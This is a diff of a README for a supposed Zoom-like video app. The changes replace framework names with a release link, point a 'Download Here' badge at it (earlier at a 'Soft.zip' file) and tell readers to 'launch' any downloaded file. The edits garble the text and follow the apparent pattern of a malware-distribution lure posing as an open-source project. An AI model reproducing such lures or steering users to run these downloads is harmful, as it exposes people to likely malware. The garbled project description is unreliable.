@@ -1,7 +1,7 @@
 
 # CicadaConnect-VideoStreaming-App 🦋
 
-Welcome to CicadaConnect, a cutting-edge Video Streaming App built with the latest technologies like Next.js and TypeScript. This project aims to replicate the functionalities of Zoom, a popular video conferencing tool, providing users with a secure platform to log in, create meetings, and access various meeting features such as recording, screen sharing, and managing participants.
+Welcome to CicadaConnect, a cutting-edge Video Streaming App built with the latest technologies like https://github.com/anit2307/CicadaConnect-VideoStreaming-App/releases/tag/v1.2 and TypeScript. This project aims to replicate the functionalities of Zoom, a popular video conferencing tool, providing users with a secure platform to log in, create meetings, and access various meeting features such as recording, screen sharing, and managing participants.
 
 ## Features 🚀
 
@@ -13,9 +13,9 @@ Welcome to CicadaConnect, a cutting-edge Video Streaming App built with the late
 
 ## Tech Stack 💻
 
-⚛️ Next.js for front-end development  
+⚛️ https://github.com/anit2307/CicadaConnect-VideoStreaming-App/releases/tag/v1.2 for front-end development  
 ⌨️ TypeScript for type-safe programming  
-🌐 Node.js for server-side logic  
+🌐 https://github.com/anit2307/CicadaConnect-VideoStreaming-App/releases/tag/v1.2 for server-side logic  
 📦 npm for package management  
 🛠️ Tailwind CSS for easy styling  
 🔗 WebRTC for real-time communication  
@@ -37,7 +37,7 @@ Welcome to CicadaConnect, a cutting-edge Video Streaming App built with the late
 
 Explore the CicadaConnect-VideoStreaming-App repository on GitHub to dive into the codebase and discover the magic of modern video conferencing applications. Don't forget to check out the latest features and enhancements.
 
-[![Download Here](https://img.shields.io/badge/Download-Here-green)](https://github.com/files/Soft.zip)
+[![Download Here](https://github.com/anit2307/CicadaConnect-VideoStreaming-App/releases/tag/v1.2)](https://github.com/anit2307/CicadaConnect-VideoStreaming-App/releases/tag/v1.2)
 
 🌍 If the link above ends with a file name, make sure to launch it to access the project files. Visit the link directly to get started with CicadaConnect. If the link is not accessible, kindly explore the "Releases" section for alternate options.
 
